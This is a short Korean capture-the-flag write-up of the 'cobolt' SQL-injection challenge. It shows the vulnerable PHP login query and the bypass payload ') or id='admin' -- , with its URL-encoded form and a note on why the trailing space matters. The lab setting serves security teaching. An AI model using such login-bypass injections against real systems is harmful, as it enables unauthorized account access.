# COBOLT

## Problem
```php
<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

## Inspection
* `select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')`
	- 파라미터로 `id`와 `pw`가 넘겨진다.
	- `pw`는 `md5()`로 암호화한다.
* `if($result['id'] == 'admin') solve("cobolt");`
	- 쿼리문의 결과의 `id`가 `admin`이 나타나야 통과한다.
	
## Solution
* 걸러지지 않는 탈출문자(`'`)와 `AND`, `OR` 연산자 우선순위의 차이, 그리고 주석처리를 이용한다.
	- `?id=admin&pw=') or id='admin' -- `
	- `?id=admin&pw=%27)%20or%20id=%27admin%27%20--%20` 
	- 맨 뒤에도 반드시 띄어쓰기가 들어가야 한다. 띄어쓰기가 URL Encoded 된 `%20`을 넣어줘야 주석 처리가 잘 된다.
	- 쿼리가 `select id from prob_cobolt where id='admin' and pw=md5('') or id='admin' -- ')`와 같이 정상적으로 처리된다.